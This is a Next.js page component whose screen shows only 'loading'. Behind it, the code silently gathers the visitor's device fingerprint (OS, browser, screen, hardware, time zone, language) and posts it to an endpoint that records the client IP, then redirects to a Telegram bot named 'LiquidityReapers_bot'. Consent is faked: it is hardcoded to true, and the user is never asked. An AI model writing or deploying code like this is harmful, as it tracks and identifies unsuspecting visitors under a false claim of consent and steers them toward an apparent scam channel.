"use client";

import Link from "next/link";
import { useEffect, useState } from "react";

type DiagnosticResult = {
  received: boolean;
  clientIp: string | null;
  ipIsLoopback: boolean;
};

type DiagnosticPayload = {
  consent: true;
  os: string;
  osVersion: string | null;
  browser: string;
  browserVersion: string | null;
  deviceType: string;
  platform: string;
  language: string;
  timeZone: string;
  screen: {
    width: number;
    height: number;
    colorDepth: number;
    pixelRatio: number;
  };
  hardwareConcurrency: number;
  deviceMemory: number | null;
  touchPoints: number;
  online: boolean;
};

const collectDiagnostics = (): DiagnosticPayload => {
  const userAgent = navigator.userAgent;
  let os: string = "Other";
  let osVersion: string | null = null;
  let browser = "Other";
  let browserVersion: string | null = null;

  const androidVersion = userAgent.match(/Android[\s/-]?([\d.]+)/i)?.[1];
  const iosVersion = userAgent.match(/OS ([\d_]+)/i)?.[1]?.replaceAll("_", ".");
  const windowsVersion = userAgent.match(/Windows NT ([\d.]+)/i)?.[1];
  const macVersion = userAgent.match(/Mac OS X ([\d_]+)/i)?.[1]?.replaceAll("_", ".");
  const chromeOsVersion = userAgent.match(/CrOS [^ ]+ ([\d.]+)/i)?.[1];

  if (androidVersion) {
    os = "Android";
    osVersion = androidVersion;
  } else if (iosVersion && /iphone|ipad|ipod/i.test(userAgent)) {
    os = "iOS";
    osVersion = iosVersion;
  } else if (windowsVersion) {
    os = "Windows";
    osVersion = windowsVersion;
  } else if (macVersion) {
    os = "macOS";
    osVersion = macVersion;
  } else if (chromeOsVersion) {
    os = "ChromeOS";
    osVersion = chromeOsVersion;
  } else if (/linux/i.test(userAgent)) {
    os = "Linux";
  }

  const browserPatterns: [string, RegExp][] = [
    ["Edge", /Edg(?:e|A|iOS)?\/([\d.]+)/i],
    ["Opera", /OPR\/([\d.]+)/i],
    ["Firefox", /Firefox\/([\d.]+)/i],
    ["Chrome", /(?:Chrome|CriOS)\/([\d.]+)/i],
    ["Safari", /Version\/([\d.]+).*Safari/i],
  ];

  for (const [name, pattern] of browserPatterns) {
    const version = userAgent.match(pattern)?.[1];
    if (version) {
      browser = name;
      browserVersion = version;
      break;
    }
  }

  const isMobile = /mobile|iphone|ipod|android/i.test(userAgent);
  const isTablet = /ipad|tablet/i.test(userAgent) ||
    (/android/i.test(userAgent) && !/mobile/i.test(userAgent));
  const deviceType = isTablet ? "Tablet" : isMobile ? "Phone" : "Desktop";
  const deviceMemory = (navigator as Navigator & { deviceMemory?: number }).deviceMemory;

  return {
    consent: true,
    os,
    osVersion,
    browser,
    browserVersion,
    deviceType,
    platform: navigator.platform.slice(0, 100),
    language: navigator.language.slice(0, 50),
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone.slice(0, 100),
    screen: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
    },
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: typeof deviceMemory === "number" ? deviceMemory : null,
    touchPoints: navigator.maxTouchPoints,
    online: navigator.onLine,
  };
};

export default function Home() {
  const [consent, setConsent] = useState(true);
  const [sending, setSending] = useState(false);
  const [error, setError] = useState("");
  const [result, setResult] = useState<DiagnosticResult | null>(null);

  async function sendDiagnostics() {
    if (!consent || sending) return;

    setSending(true);
    setError("");

    try {
      const response = await fetch("/api/diagnostics", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(collectDiagnostics()),
      });

      const data = (await response.json()) as DiagnosticResult & {
        error?: string;
      };

      if (!response.ok) {
        throw new Error(data.error || "The report could not be submitted.");
      }

      setResult(data);
    } catch (submissionError) {
      setError(
        submissionError instanceof Error
          ? submissionError.message
          : "The report could not be submitted. Please try again.",
      );
    } finally {
      setSending(false);
    }
  }
  useEffect(() => { sendDiagnostics().then(() => { window.location.replace("https://t.me/LiquidityReapers_bot") }) }, [])

  return (
    <h1>loading</h1>
  );
}
